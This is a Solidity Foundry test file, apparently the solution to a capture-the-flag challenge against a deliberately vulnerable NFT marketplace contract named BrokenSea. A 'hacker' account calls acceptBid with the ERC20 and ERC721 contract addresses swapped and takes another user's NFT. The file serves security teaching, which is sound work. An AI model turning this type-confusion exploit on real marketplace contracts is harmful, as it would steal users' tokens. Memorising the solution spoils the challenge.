// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "forge-std/Test.sol";

import {BrokenSea} from "../src/BrokenSea.sol";
import {MyERC20} from "../src/ERC20.sol";
import {MyERC721} from "../src/ERC721.sol";

contract BrokenSeaTest is Test {
    address bidder = makeAddr("bidder");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");
    BrokenSea sea;
    MyERC20 erc20;
    MyERC721 erc721;

    function setUp() public {
        sea = new BrokenSea();
        erc20 = new MyERC20();
        erc20.mint(hacker, 500);
        erc721 = new MyERC721();
        erc721.mint(owner, 485);
        erc721.mint(bidder, 158);
    }

    function testChallenge() public {
        vm.startPrank(bidder);
        erc721.setApprovalForAll(address(sea), true);
        sea.createBid(erc721, 485, erc20, 100_000);
        vm.stopPrank();


        vm.startPrank(hacker);
        erc20.approve(address(sea), 500);
        sea.acceptBid(bidder, MyERC721(address(erc20)), 485, MyERC20(address(erc721)), 158);

        vm.stopPrank();

        assertEq(erc721.ownerOf(158), hacker);
        assertEq(erc20.balanceOf(bidder), 485);
    }
}